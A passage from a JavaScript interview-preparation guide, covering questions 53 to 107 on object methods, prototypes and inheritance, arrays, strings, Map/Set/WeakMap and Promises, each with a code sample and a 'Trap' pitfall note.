**A:** Like `Object.keys()`, but returns the corresponding values instead of the keys.

```javascript
const obj = { a: 1, b: 2, c: 3 };
Object.values(obj); // [1, 2, 3]
```

**Trap:** Order isn't arbitrary — integer-like keys are iterated in ascending numeric order first, then string keys in insertion order.

### Q54. What is `Object.entries()`?

**A:** Returns an array of `[key, value]` pairs — the format needed to convert an object into a `Map`, or to iterate with `for...of`.

```javascript
const obj = { a: 1, b: 2 };
Object.entries(obj); // [['a', 1], ['b', 2]]

for (const [key, value] of Object.entries(obj)) {
  console.log(`${key}: ${value}`);
}

const map = new Map(Object.entries(obj)); // handy object -> Map conversion
```

**Trap:** `Object.fromEntries()` is the inverse — converts `[[k,v],...]` pairs back into an object, useful after filtering `Object.entries()`.

### Q55. What is `Object.assign()`?

**A:** Copies all enumerable own properties from one or more source objects into a target object, returning the (mutated) target. Commonly used for shallow merging or shallow cloning.

```javascript
const target = { a: 1 };
const source = { b: 2, c: 3 };
Object.assign(target, source);
console.log(target); // { a: 1, b: 2, c: 3 } - target itself is mutated

// Common pattern: clone instead of mutate, by using {} as the target
const clone = Object.assign({}, { a: 1, b: 2 });

// Later sources override earlier ones on key conflicts
Object.assign({}, { x: 1 }, { x: 2 }); // { x: 2 }
```

**Trap:** It's a **shallow** copy — nested objects are still shared by reference, same caveat as spread (`{...obj}`), see Q56.

### Q56. What is the difference between shallow copy and deep copy?

**A:** A shallow copy duplicates only the top-level properties — nested objects/arrays remain shared references between original and copy. A deep copy recursively duplicates everything, so the copy is fully independent.

```javascript
const original = { a: 1, nested: { b: 2 } };

const shallow = { ...original };
shallow.nested.b = 99;
console.log(original.nested.b); // 99 - changed! nested object is shared

const deep = structuredClone(original);
deep.nested.b = 42;
console.log(original.nested.b); // still 99 - deep copy is fully independent
```

**Trap:** Spread (`{...obj}`), `Object.assign()`, and `Array.prototype.slice()` are all shallow-only — a very common bug is assuming any of these gives full independence.

### Q57. What is `Object.freeze()`?

**A:** Makes an object **shallowly** immutable — prevents adding, removing, or reassigning top-level properties. Silently fails (or throws in strict mode) on any mutation attempt.

```javascript
const frozen = Object.freeze({ name: "John", nested: { age: 25 } });
frozen.name = "Jane"; // fails silently
frozen.city = "NYC"; // fails - can't add
delete frozen.name; // fails - can't delete
console.log(frozen.name); // "John" - unchanged

frozen.nested.age = 99; // WORKS! - freeze doesn't reach into nested objects
console.log(Object.isFrozen(frozen)); // true
```

**Trap:** Shallow only — nested objects stay fully mutable, a frequent source of "but I froze it!" bugs.

### Q58. What is `Object.seal()`?

**A:** Weaker than `freeze()` — prevents adding or removing properties, but existing properties can still be reassigned.

```javascript
const sealed = Object.seal({ name: "John" });
sealed.name = "Jane"; // works - values can still change
sealed.city = "NYC"; // fails - can't add new properties
delete sealed.name; // fails - can't delete

console.log(Object.isSealed(sealed)); // true
```

**Trap:** Remember the direction: `seal` locks the *shape* (no add/delete) but not the *values*; `freeze` locks both.

### Q59. What is the difference between `Object.freeze()` and `Object.seal()`?

**A:**

| | Add props | Modify props | Delete props |
| --- | --- | --- | --- |
| `Object.seal()` | ❌ | ✅ | ❌ |
| `Object.freeze()` | ❌ | ❌ | ❌ |

```javascript
const sealed = Object.seal({ x: 1 });
sealed.x = 2; // works
const frozen = Object.freeze({ x: 1 });
frozen.x = 2; // fails
```

**Trap:** Both checks have `is` counterparts (`Object.isSealed()`, `Object.isFrozen()`) — worth mentioning to show you know the full API, not just the setters.

### Q60. What is `Object.create()`?

**A:** Creates a new object with the specified object as its prototype — the most direct, explicit way to set up prototypal inheritance without a constructor function or class.

```javascript
const animalProto = {
  eat() {
    return `${this.name} is eating`;
  },
};

const dog = Object.create(animalProto);
dog.name = "Rex";
dog.eat(); // "Rex is eating" - found via the prototype chain

console.log(Object.getPrototypeOf(dog) === animalProto); // true

const bareObject = Object.create(null); // no prototype at all - no inherited methods
```

**Trap:** This is literally what `class extends` and constructor-function inheritance do under the hood — being able to show the manual `Object.create()` version proves you understand the mechanism, not just the syntax sugar.

### Q61. What is a prototype?

**A:** Every object has an internal link to another object (its prototype) that it inherits properties and methods from. Functions additionally have a `.prototype` property, used as the template for objects created via `new`.

```javascript
function Person(name) {
  this.name = name;
}
Person.prototype.greet = function () {
  return `Hello, ${this.name}`;
};
const p = new Person("John");
p.greet(); // "Hello, John" - found on Person.prototype, not on p itself
```

**Trap:** `p.greet` doesn't exist as an own property of `p` — `p.hasOwnProperty('greet')` is `false`, even though `p.greet()` works fine.

### Q62. What is prototype chaining?

**A:** When you access a property, JS checks the object itself, then walks up the chain of prototypes (`__proto__` links) until it finds the property or reaches `null`.

```javascript
function Animal(name) { this.name = name; }
Animal.prototype.eat = function () { return `${this.name} is eating`; };

function Dog(name) { Animal.call(this, name); }
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;
Dog.prototype.bark = function () { return `${this.name} says Woof!`; };

const rex = new Dog("Rex");
rex.bark(); // found on Dog.prototype
rex.eat(); // found on Animal.prototype (walked up the chain)
rex.toString(); // found on Object.prototype (end of chain)
// Chain: rex -> Dog.prototype -> Animal.prototype -> Object.prototype -> null
```

**Trap:** The chain always terminates at `Object.prototype -> null` — that's why every object (unless created with `Object.create(null)`) has `.toString()`, `.hasOwnProperty()`, etc. for free.

### Q63. What is the difference between `__proto__` and `prototype`?

**A:** `.prototype` exists only on functions/classes and is what new instances will inherit from. `__proto__` (or `Object.getPrototypeOf()`) exists on every object and points to what it actually inherits from.

```javascript
function Person() {}
const p = new Person();

Person.prototype; // the object new instances inherit from
p.__proto__ === Person.prototype; // true - same object

Object.getPrototypeOf(p); // preferred over __proto__ directly (standard method)
```

**Trap:** `__proto__` is a legacy accessor, technically deprecated in favor of `Object.getPrototypeOf()`/`Object.setPrototypeOf()` — mention the modern API even while explaining the legacy one, since interviewers notice which you default to.

### Q64. How does inheritance work in JavaScript?

**A:** Via the prototype chain — an object "inherits" by having another object as its prototype, so property lookups fall through to it. `class extends` is the modern syntax for setting this up.

```javascript
class Animal {
  constructor(name) { this.name = name; }
  eat() { return `${this.name} is eating`; }
}
class Dog extends Animal {
  bark() { return `${this.name} says Woof!`; }
}
const rex = new Dog("Rex");
rex.eat(); // inherited from Animal
rex.bark(); // own method
rex instanceof Animal; // true
```

**Trap:** JS inheritance is prototypal, not classical — even with `class` syntax, there's no true "copying" of a blueprint; instances just delegate lookups up a live chain of objects.

### Q65. What is constructor function inheritance?

**A:** The pre-ES6 pattern for inheritance: call the parent constructor with `.call()` to set up instance properties, then manually link the child's prototype to the parent's.

```javascript
function Animal(name) {
  this.name = name;
}
Animal.prototype.eat = function () {
  return `${this.name} is eating`;
};

function Dog(name) {
  Animal.call(this, name); // borrow the parent constructor
}
Dog.prototype = Object.create(Animal.prototype); // link prototypes
Dog.prototype.constructor = Dog; // fix the constructor reference

const rex = new Dog("Rex");
rex.eat(); // "Rex is eating"
```

**Trap:** Forgetting `Dog.prototype.constructor = Dog` after reassigning the prototype leaves `rex.constructor` pointing to `Animal` — a subtle bug that `class extends` avoids automatically.

### Q66. What is the difference between an own property and an inherited property? *(new)*

**A:** Own properties exist directly on the object; inherited properties are found further up the prototype chain but accessed as if they were on the object itself.

```javascript
function Animal(name) { this.name = name; }
Animal.prototype.eat = function () {};

const rex = new Animal("Rex");

rex.name; // own property
rex.eat; // inherited property (lives on Animal.prototype)

rex.hasOwnProperty("name"); // true
rex.hasOwnProperty("eat"); // false - inherited, not own
```

**Trap:** `for...in` loops over BOTH own and inherited enumerable properties, unless you explicitly filter with `hasOwnProperty()` inside the loop — a classic source of unexpected extra keys.

### Q67. What is `hasOwnProperty()`? *(new)*

**A:** An instance method (inherited from `Object.prototype`) that checks whether a property exists directly on the object, ignoring the prototype chain.

```javascript
const obj = { name: "John" };
obj.hasOwnProperty("name"); // true
obj.hasOwnProperty("toString"); // false - inherited from Object.prototype

// Safer form when obj's prototype might be tampered with or null:
Object.prototype.hasOwnProperty.call(obj, "name"); // true

// Modern alternative (ES2022):
Object.hasOwn(obj, "name"); // true - doesn't rely on the object having the method
```

**Trap:** If an object was created with `Object.create(null)`, it has no `hasOwnProperty` method at all — calling `obj.hasOwnProperty()` throws. `Object.hasOwn(obj, key)` avoids this entirely and is the modern recommendation.

### Q68. What is the difference between the `in` operator and `hasOwnProperty()`? *(new)*

**A:** `in` checks the entire prototype chain (own + inherited); `hasOwnProperty()` checks only the object's own properties.

```javascript
const obj = { name: "John" };

"name" in obj; // true - own property
"toString" in obj; // true - inherited from Object.prototype!
obj.hasOwnProperty("toString"); // false - not an own property
```

**Trap:** `in` returning `true` for inherited built-ins like `toString` surprises people expecting it to behave like `hasOwnProperty()` — use `in` when you genuinely want to include inherited properties, `hasOwnProperty()` (or `Object.hasOwn()`) when you don't.

### Q69. How do you clone an object safely?

**A:** For shallow needs, spread or `Object.assign()`; for full independence, `structuredClone()` (modern, built-in) or a recursive custom function for edge cases it doesn't cover.

```javascript
const original = { a: 1, nested: { b: 2 }, date: new Date() };

const shallow = { ...original }; // shallow only
const deep = structuredClone(original); // deep, handles Date/Map/Set/etc.

deep.nested.b = 99;
console.log(original.nested.b); // 2 - untouched, truly independent
```

**Trap:** `structuredClone()` still can't clone functions or class instance methods (it throws `DataCloneError`) — for objects containing functions, you need a custom recursive clone or a library.

### Q70. What are the limitations of `JSON.parse(JSON.stringify(obj))` for cloning?

**A:** A common but flawed deep-clone trick — it silently drops or mangles anything JSON can't represent.

```javascript
const obj = {
  fn: () => {}, // dropped entirely
  undef: undefined, // dropped entirely
  sym: Symbol("x"), // dropped entirely
  date: new Date(), // becomes a STRING, not a Date object
  map: new Map(), // becomes {} - completely broken
  circular: null,
};
obj.circular = obj; // circular reference

JSON.stringify(obj); // TypeError: Converting circular structure to JSON

const clone = JSON.parse(JSON.stringify({ date: new Date() }));
clone.date instanceof Date; // false! - it's now a string
```

**Trap:** This trick also throws entirely on circular references, and silently reorders/loses `undefined` values in arrays (`[undefined]` becomes `[null]`) — `structuredClone()` (Q69) fixes nearly all of these limitations.

---

<a id="phase-4"></a>

## Phase 4 – Arrays, Strings, Maps, Sets & Data Handling

**Goal:** Prepare for day-to-day frontend data transformation questions.

### Q71. What are arrays in JavaScript?

**A:** Ordered, index-based lists that can hold mixed types — technically a special kind of object with numeric keys and a `length` property that auto-updates.

```javascript
const arr = [1, "two", { three: 3 }, [4]];
arr.length; // 4
typeof arr; // "object" - arrays ARE objects
Array.isArray(arr); // true - the correct way to check (typeof can't tell arrays from objects)
```

**Trap:** `typeof arr` returns `"object"`, not `"array"` — always use `Array.isArray()` for a real type check.

### Q72. What is the difference between `map`, `filter`, and `reduce`?

**A:**

```javascript
const nums = [1, 2, 3, 4];

nums.map((x) => x * 2); // [2, 4, 6, 8] - transforms EVERY item, same length out
nums.filter((x) => x > 2); // [3, 4] - keeps SOME items, shorter (or equal) length
nums.reduce((acc, x) => acc + x, 0); // 10 - collapses to a SINGLE value
```

**Trap:** All three are non-mutating — they return a new array (or value) and leave the original untouched, unlike `sort()`, `splice()`, `push()`, etc.

### Q73. What is the difference between `forEach` and `map`?

**A:** `forEach` runs a function per item and always returns `undefined` — it's for side effects. `map` returns a *new array* built from the callback's return values — it's for transformation.

```javascript
const nums = [1, 2, 3];

const result1 = nums.forEach((x) => x * 2);
console.log(result1); // undefined - forEach doesn't collect anything

const result2 = nums.map((x) => x * 2);
console.log(result2); // [2, 4, 6] - map collects the return values
```

**Trap:** Using `forEach` when you meant `map` (or vice versa) is one of the most common junior mistakes — if you need the transformed array, it's always `map`.

### Q74. What is the difference between `find` and `filter`?

**A:** `find` returns the first matching *element* (or `undefined`); `filter` returns an *array* of all matches (possibly empty).

```javascript
const users = [{ id: 1 }, { id: 2 }, { id: 3 }];

users.find((u) => u.id === 2); // { id: 2 } - single object
users.filter((u) => u.id > 1); // [{ id: 2 }, { id: 3 }] - array

users.find((u) => u.id === 99); // undefined - no match
users.filter((u) => u.id === 99); // [] - empty array, not undefined
```

**Trap:** `find` stops iterating as soon as it finds a match (more efficient for "does one exist" checks); `filter` always processes the entire array.

### Q75. What is the difference between `some` and `every`?

**A:** `some` returns `true` if **at least one** element passes the test; `every` returns `true` only if **all** elements pass.

```javascript
const nums = [1, 2, 3, 4];

nums.some((x) => x > 3); // true - at least one (4) passes
nums.every((x) => x > 0); // true - all pass
nums.every((x) => x > 2); // false - not all pass

[].every((x) => x > 100); // true! - vacuously true on empty arrays
[].some((x) => x > 100); // false - vacuously false on empty arrays
```

**Trap:** Both short-circuit (`some` stops at the first `true`, `every` stops at the first `false`) — and the empty-array behavior (`every` → `true`, `some` → `false`) surprises people who haven't hit it before.

### Q76. What is the difference between `slice` and `splice`? *(new)*

**A:** `slice` is non-mutating — returns a shallow copy of a portion without touching the original. `splice` **mutates** the original array in place, removing/replacing/inserting elements.

```javascript
const arr = [1, 2, 3, 4, 5];

const sliced = arr.slice(1, 3); // [2, 3] - new array
console.log(arr); // [1, 2, 3, 4, 5] - unchanged

const removed = arr.splice(1, 2); // removes 2 items starting at index 1
console.log(removed); // [2, 3] - the removed items
console.log(arr); // [1, 4, 5] - original array MUTATED

arr.splice(1, 0, "a", "b"); // insert without removing (deleteCount = 0)
console.log(arr); // [1, 'a', 'b', 4, 5]
```

**Trap:** The names are easy to confuse — remember "sp-LICE mutates," "SLICE doesn't." Mixing them up in production is a classic source of "why did my original array change" bugs.

### Q77. What is the difference between `push`, `pop`, `shift`, and `unshift`?

**A:** All four mutate the array in place, operating on either end.

```javascript
const arr = [2, 3, 4];

arr.push(5); // adds to END -> [2,3,4,5], returns new length (4)
arr.pop(); // removes from END -> [2,3,4], returns removed item (5)
arr.unshift(1); // adds to START -> [1,2,3,4], returns new length (4)
arr.shift(); // removes from START -> [2,3,4], returns removed item (1)
```

**Trap:** `shift`/`unshift` are O(n) — every remaining element has to be re-indexed — while `push`/`pop` are O(1). For large arrays, prefer the end of the array when performance matters.

### Q78. What are sparse arrays? *(new)*

**A:** Arrays with "holes" — missing indices that aren't actually `undefined` values, just absent entirely. Created via the `Array` constructor, `delete`, or skipping indices in a literal.

```javascript
const sparse = [1, , 3]; // hole at index 1
console.log(sparse.length); // 3
console.log(sparse[1]); // undefined (when read)
console.log(1 in sparse); // false - the slot doesn't actually exist

const arr2 = new Array(3); // [empty x 3] - fully sparse, length 3, no elements

sparse.forEach((x) => console.log(x)); // logs 1 and 3 ONLY - skips the hole!
sparse.map((x) => x * 2); // [2, <1 empty item>, 6] - also skips holes
```

**Trap:** Most iteration methods (`forEach`, `map`, `filter`) **skip holes entirely** — a hole is not the same as an element containing `undefined`, which trips people up when debugging "missing" array items.

### Q79. What happens when you use `delete` on an array element? *(new)*

**A:** It removes the value but leaves a **hole** — the array's `length` doesn't change, and the slot becomes sparse rather than actually shifting elements down.

```javascript
const arr = [1, 2, 3];
delete arr[1];
console.log(arr); // [ 1, <1 empty item>, 3 ]
console.log(arr.length); // 3 - unchanged!
console.log(arr[1]); // undefined
console.log(1 in arr); // false - the index doesn't exist anymore
```

**Trap:** `delete` on an array is almost always the wrong tool — use `splice()` if you want to actually remove an element and shift the rest down, keeping `length` accurate.

### Q80. How do you flatten an array?

**A:**

```javascript
const nested = [1, [2, 3], [4, [5, 6]]];

nested.flat(); // [1, 2, 3, 4, [5, 6]] - default depth 1
nested.flat(Infinity); // [1, 2, 3, 4, 5, 6] - fully flat, any depth

nested.flatMap((x) => (Array.isArray(x) ? x : [x])); // map + flat(1) in one pass
```

**Trap:** `flat()`'s default depth is only `1` — a common bug is expecting it to fully flatten deeply nested arrays without passing `Infinity` (or a large enough number).

### Q81. How do you remove duplicates from an array?

**A:** The `Set` constructor is the standard, concise approach for primitive values.

```javascript
const nums = [1, 2, 2, 3, 3, 3];
const unique = [...new Set(nums)]; // [1, 2, 3]

// For objects, Set won't help (different references) - dedupe by a key instead:
const users = [{ id: 1 }, { id: 2 }, { id: 1 }];
const uniqueUsers = [...new Map(users.map((u) => [u.id, u])).values()];
```

**Trap:** `Set` dedupes by reference for objects, not by shape — `new Set([{a:1}, {a:1}])` keeps both since they're different object references, even though they look identical.

### Q82. What is array destructuring?

**A:** Unpacking array values into individual variables by position, with support for skipping, defaults, and rest collection.

```javascript
const [a, b, c] = [1, 2, 3];
const [first, , third] = [1, 2, 3]; // skip index 1
const [x = 10, y = 20] = [5]; // x=5, y=20 (default used)
const [head, ...tail] = [1, 2, 3, 4]; // head=1, tail=[2,3,4]

// Swapping without a temp variable:
let m = 1, n = 2;
[m, n] = [n, m]; // m=2, n=1
```

**Trap:** Destructuring reads by **position**, not name — unlike object destructuring, which reads by key name.

### Q83. What are rest and spread operators?

**A:** Same `...` syntax, opposite direction: **rest** collects multiple values *into* an array/object; **spread** expands an array/object *out* into individual elements.

```javascript
// Rest - gathering (in function params or destructuring)
function sum(...nums) { return nums.reduce((a, b) => a + b, 0); }
const [first, ...rest] = [1, 2, 3]; // rest = [2, 3]

// Spread - expanding (in calls, literals)
const arr = [1, 2, 3];
console.log(Math.max(...arr)); // spread into function arguments
const combined = [...arr, 4, 5]; // spread into a new array
const merged = { ...{ a: 1 }, ...{ b: 2 } }; // spread into a new object
```

**Trap:** Rest **must be the last** parameter/element in its pattern — `function f(...rest, last)` is a `SyntaxError`.

### Q84. What is the difference between rest and spread? *(new)*

**A:** Context determines which one you're looking at, even though the syntax is identical:

```javascript
// REST - appears on the LEFT side of an assignment, or in a function signature
function example(...args) {} // rest - collects arguments into an array
const [a, ...others] = [1, 2, 3]; // rest - collects remaining items

// SPREAD - appears on the RIGHT side / inside a call or literal
const arr = [1, 2, 3];
example(...arr); // spread - expands the array into individual arguments
const copy = [...arr]; // spread - expands into a new array literal
```

**Trap:** The one-line rule interviewers want: "rest gathers, spread spreads" — and syntactically, rest only ever appears in a *binding* position (function params, destructuring patterns), spread everywhere else.

### Q85. What is a Set?

**A:** A collection of **unique** values of any type, iterable, with guaranteed insertion order.

```javascript
const set = new Set([1, 2, 2, 3]);
console.log(set); // Set(3) {1, 2, 3} - duplicates auto-removed
set.add(4);
set.has(2); // true
set.delete(1);
console.log(set.size); // 3 - not .length
```

**Trap:** Use `.size`, not `.length` — a common typo carried over from array habits.

### Q86. What is a Map?

**A:** A collection of key-value pairs where keys can be **any type** (unlike plain objects, whose keys coerce to strings), with guaranteed insertion order and a `.size` property.

```javascript
const map = new Map();
const objKey = { id: 1 };

map.set("stringKey", "value1");
map.set(objKey, "value2"); // object as a key - impossible with {}
map.set(42, "value3");

map.get(objKey); // "value2"
map.size; // 3

for (const [key, value] of map) {
  console.log(key, value); // directly iterable
}
```

**Trap:** `map.set(key, val)` returns the Map itself (chainable), not the value — different from how you might expect based on similar-looking object patterns.

### Q87. What is the difference between Map and Object?

**A:**

| | Object | Map |
| --- | --- | --- |
| Key types | Strings/Symbols only | Any value |
| Key order | Not spec-guaranteed pre-ES2015 semantics | Guaranteed insertion order |
| Size | `Object.keys(obj).length` | `.size` |
| Iteration | Needs `Object.entries()` etc. | Directly iterable |
| Performance | Fine for small, string-keyed data | Better for frequent add/remove |

```javascript
const obj = {};
obj[{}] = "value"; // key coerced to the string "[object Object]"!

const map = new Map();
map.set({}, "value"); // key stays a real object reference
```

**Trap:** Using an object as an object key silently coerces it to `"[object Object]"` — a real (and confusing) bug that `Map` completely avoids.

### Q88. What is a WeakMap?

**A:** Like `Map`, but keys must be objects, and those keys are held **weakly** — if nothing else references the key object, it (and its entry) can be garbage collected. Not iterable, no `.size`.

```javascript
let obj = { id: 1 };
const wm = new WeakMap();
wm.set(obj, "metadata");
console.log(wm.get(obj)); // "metadata"

obj = null; // no other references to the original object now
// The WeakMap entry becomes eligible for garbage collection automatically
```

**Trap:** You can't iterate a `WeakMap` (no `.keys()`, no `for...of`) — that's not an oversight, it's required, since entries can vanish at any time via GC and iteration order would be nondeterministic.

### Q89. What is a WeakSet?

**A:** Like `Set`, but can only hold objects (not primitives), held weakly, not iterable, no `.size`.

```javascript
let obj = { id: 1 };
const ws = new WeakSet();
ws.add(obj);
ws.has(obj); // true

obj = null; // eligible for GC, entry disappears from the WeakSet automatically
```

**Trap:** Common real use case: tracking "has this DOM node/object already been processed" without preventing it from being garbage collected once removed from the page.

### Q90. What is the difference between Map and WeakMap? *(new)*

**A:**

```javascript
// Map: any key type, iterable, prevents garbage collection of its keys
const map = new Map();
map.set("string key", "ok"); // primitives allowed as keys
map.size; // has size
for (const entry of map) {
} // iterable

// WeakMap: object keys ONLY, NOT iterable, does NOT prevent GC
const wm = new WeakMap();
// wm.set("string", "fail");  // TypeError - WeakMap keys must be objects
wm.set({}, "ok");
// wm.size;                   // undefined - no size property
// for (const e of wm) {}     // TypeError - not iterable
```

**Trap:** The core trade-off to state clearly: `Map` is more flexible but can leak memory if you forget to clean up entries; `WeakMap` self-cleans but sacrifices iteration and primitive keys — pick based on whether you need to enumerate entries.

### Q91. What is the difference between Set and WeakSet? *(new)*

**A:** Same relationship as Map/WeakMap — `Set` allows any value type and is iterable; `WeakSet` allows only objects, isn't iterable, and allows garbage collection of unreferenced entries.

```javascript
const set = new Set([1, "two", { three: 3 }]); // any type allowed
set.size; // has size, is iterable

const ws = new WeakSet();
ws.add({}); // objects only
// ws.add(1);                 // TypeError - primitives not allowed
// [...ws];                   // TypeError - not iterable
```

**Trap:** `WeakSet`'s main real-world use is metadata tagging (e.g., "mark this DOM node as already initialized") without creating a memory leak if the node is later removed from the page.

### Q92. What are template literals?

**A:** Backtick-delimited strings supporting embedded expressions (`${}`) and multi-line text without concatenation.

```javascript
const name = "John";
const age = 25;
const message = `Hello, ${name}! You are ${age} years old.`;

const multiLine = `Line 1
Line 2`; // real newline, no \n needed

const html = `<div>${age > 18 ? "Adult" : "Minor"}</div>`; // expressions allowed
```

**Trap:** Template literals don't replace the need for escaping — a literal backtick or `${` inside the string still needs `\` `` \` `` or `\${`.

### Q93. What are tagged templates?

**A:** A function called with a template literal's parts split into an array of string segments plus the interpolated values, allowing custom processing (sanitization, i18n, styled-components-style CSS-in-JS).

```javascript
function highlight(strings, ...values) {
  return strings.reduce(
    (result, str, i) => `${result}${str}${values[i] ? `**${values[i]}**` : ""}`,
    "",
  );
}

const name = "John";
const result = highlight`Hello, ${name}! Welcome.`;
console.log(result); // "Hello, **John**! Welcome."
```

**Trap:** This is exactly how libraries like `styled-components` (`` styled.div`color: red;` ``) work under the hood — a good way to show the concept isn't just academic.

### Q94. What are common string methods used in JavaScript? *(new)*

**A:**

```javascript
const str = "  Hello World  ";

str.trim(); // "Hello World" - remove whitespace both ends
str.toLowerCase(); // "  hello world  "
str.toUpperCase(); // "  HELLO WORLD  "
str.includes("World"); // true
str.startsWith("  He"); // true
str.replace("World", "JS"); // replaces first match only
str.replaceAll("l", "L"); // replaces ALL matches (ES2021+)
str.split(" "); // ['', '', 'Hello', 'World', '', '']
str.slice(2, 7); // "Hello" - supports negative indices
str.padStart(20, "*"); // pad to a fixed length
str.repeat(3); // repeats the string
"5".padStart(3, "0"); // "005" - common for formatting IDs
```

**Trap:** `replace()` only replaces the **first** match unless you pass a global regex (`/pattern/g`) — `replaceAll()` (ES2021) is the more intuitive modern choice for plain strings.

### Q95. How do you compare strings safely? *(new)*

**A:** For simple equality, `===` is fine. For sorting or locale-aware comparison (accents, case, different alphabets), use `localeCompare()` rather than raw `<`/`>`.

```javascript
"apple" === "apple"; // true

"a" < "b"; // true - simple ASCII/UTF-16 comparison, fine for basic cases
"Z" < "a"; // true! - uppercase letters sort before lowercase in raw comparison

// Locale-aware, handles case and accents sensibly:
"apple".localeCompare("Apple"); // negative or positive depending on locale rules
["café", "apple", "Banana"].sort((a, b) => a.localeCompare(b));
// sorts sensibly regardless of case/accents

"apple".localeCompare("apple", undefined, { sensitivity: "base" }); // 0 - case/accent-insensitive
```

**Trap:** Raw `<`/`>` comparison sorts by UTF-16 code unit, which puts all uppercase letters before all lowercase ones (`"Z" < "a"`) — a frequent source of "why is my sort weird" bugs with mixed-case data.

---

<a id="phase-5"></a>

## Phase 5 – Asynchronous JavaScript & Event Loop

**Goal:** Master the most important frontend interview area: async behavior.

### Q96. What is asynchronous programming in JavaScript? *(new)*

**A:** Running long-taking operations (network requests, timers, file I/O) without blocking the single main thread — the operation is handed off, and a callback/Promise resolves later while other code keeps running.

```javascript
console.log("1. Start");
setTimeout(() => console.log("2. Async work done"), 0);
console.log("3. End");
// Output order: 1, 3, 2 - synchronous code always runs before queued async callbacks
```

**Trap:** "Asynchronous" doesn't mean "multi-threaded" — JS remains single-threaded; async just means the engine can move on to other work instead of blocking while waiting.

### Q97. What is a callback?

**A:** A function passed to another function to be invoked later — the original mechanism for async work before Promises existed.

```javascript
function fetchData(callback) {
  setTimeout(() => callback("data loaded"), 1000);
}
fetchData((result) => console.log(result));
```

**Trap:** Not all callbacks are async (see Q28) — `Array.prototype.map`'s callback is fully synchronous.

### Q98. What is callback hell?

**A:** Deeply nested callbacks from chaining sequential async operations, producing unreadable, hard-to-maintain "pyramid of doom" code — the exact problem Promises were designed to solve.

```javascript
getUser(1, (user) => {
  getPosts(user.id, (posts) => {
    getComments(posts[0].id, (comments) => {
      console.log(comments); // 3 levels deep and growing
    }, handleError);
  }, handleError);
}, handleError);

function handleError(err) {}
```

**Trap:** The real pain isn't just indentation — it's error handling: each level needs its own error callback, and there's no single place to catch failures from any step.

### Q99. What is a Promise?

**A:** An object representing the eventual result (or failure) of an async operation — a cleaner alternative to nested callbacks, with built-in chaining and centralized error handling.

```javascript
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    const success = true;
    success ? resolve("data") : reject("error");
  }, 1000);
});

promise
  .then((result) => console.log(result))
  .catch((err) => console.error(err));
```

**Trap:** A Promise's executor function runs **synchronously and immediately** when the Promise is constructed — only the resolve/reject callbacks are deferred.

### Q100. What are the three states of a Promise?

**A:**

```javascript
const p1 = new Promise((resolve) => resolve("done")); // fulfilled
const p2 = new Promise((_, reject) => reject("failed")); // rejected
const p3 = new Promise(() => {}); // pending forever - never settles
```

**Trap:** A Promise can only transition **once** — from `pending` to either `fulfilled` or `rejected`, never back, and never both. Calling `resolve()` after `reject()` (or vice versa) is silently ignored.

### Q101. Why do we need Promises?

**A:** They flatten nested callback pyramids into a linear `.then()` chain, provide a single `.catch()` for error handling across the whole chain, and compose well with `Promise.all`/`race`/`allSettled`/`any` for coordinating multiple async operations.

```javascript
// Callback hell
step1((a) => step2(a, (b) => step3(b, (c) => console.log(c))));

// Promise chain - flat, linear, one error handler
step1p()
  .then((a) => step2p(a))
  .then((b) => step3p(b))
  .then((c) => console.log(c))
  .catch((err) => console.error(err));
```

**Trap:** Promises solve the *readability and error-handling* problem of callbacks, but not the underlying async nature of the work — `async/await` (Q110) is what makes it read like sync code.

### Q102. What is Promise chaining?

**A:** Each `.then()` returns a **new** Promise, allowing sequential async steps to be linked — and if a `.then()` returns a value, the next `.then()` receives it (if it returns a Promise, the chain waits for it to settle).

```javascript
fetch("/api/user")
  .then((res) => res.json()) // returns a Promise, chain waits for it
  .then((user) => fetch(`/api/posts/${user.id}`))
  .then((res) => res.json())
  .then((posts) => console.log(posts))
  .catch((err) => console.error("Any step's error lands here:", err));
```

**Trap:** Forgetting to `return` inside a `.then()` breaks the chain — the next `.then()` receives `undefined` instead of waiting for your async work.

### Q103. What is `Promise.resolve()`? *(new)*

**A:** Creates an already-fulfilled Promise wrapping a given value — useful for normalizing a value that might or might not already be a Promise into one you can always `.then()` on.

```javascript
Promise.resolve(5).then((val) => console.log(val)); // 5

// Handy for functions that might return sync or async values:
function getValue(useCache) {
  return useCache ? Promise.resolve(cachedValue) : fetchFromServer();
}
getValue(true).then((val) => console.log(val)); // works either way
```

**Trap:** If you pass an existing Promise into `Promise.resolve()`, it just returns that same Promise unchanged — it doesn't wrap Promises in Promises.

### Q104. What is `Promise.reject()`? *(new)*

**A:** Creates an already-rejected Promise wrapping a given reason — the rejected counterpart to `Promise.resolve()`, useful for returning a consistent Promise-based error from a function.

```javascript
function validate(age) {
  if (age < 0) return Promise.reject(new Error("Invalid age"));
  return Promise.resolve(age);
}

validate(-5).catch((err) => console.error(err.message)); // "Invalid age"
```

**Trap:** An unhandled `Promise.reject()` (with no `.catch()` anywhere in the chain) triggers an `unhandledrejection` event (see Q177) — same as any other rejected Promise.

### Q105. What is `Promise.all()`?

**A:** Runs Promises in parallel, resolving with an array of all results **only if every one succeeds** — rejects immediately (fails fast) if any single one rejects.

```javascript
Promise.all([fetch("/a"), fetch("/b"), fetch("/c")])
  .then((responses) => console.log("All succeeded:", responses))
  .catch((err) => console.error("At least one failed:", err));
```

**Trap:** "Fail fast" means you lose visibility into which of the *other* promises succeeded once one rejects — use `Promise.allSettled()` (Q106) if you need every outcome regardless of failures.

### Q106. What is `Promise.allSettled()`?

**A:** Runs Promises in parallel and always resolves once all have settled, with an array of `{status, value}` or `{status, reason}` objects — never rejects itself, regardless of individual failures.

```javascript
Promise.allSettled([
  Promise.resolve(1),
  Promise.reject("error"),
  Promise.resolve(3),
]).then((results) => console.log(results));
// [
//   { status: 'fulfilled', value: 1 },
//   { status: 'rejected', reason: 'error' },
//   { status: 'fulfilled', value: 3 }
// ]
```

**Trap:** You must check each result's `.status` manually — there's no automatic short-circuit or `.catch()` needed, since the outer Promise itself never rejects.

### Q107. What is `Promise.race()`?

**A:** Resolves or rejects as soon as the **first** Promise in the array settles (whether fulfilled or rejected) — the others keep running but their results are ignored.

```javascript
Promise.race([promise1, promise2])
  .then((result) => console.log("First result:", result))
  .catch((err) => console.error(err));

// Common use: implementing a timeout
const timeout = new Promise((_, reject) => setTimeout(() => reject("timeout"), 5000));
Promise.race([fetch("/api/data"), timeout]).catch((err) => console.error(err));
```

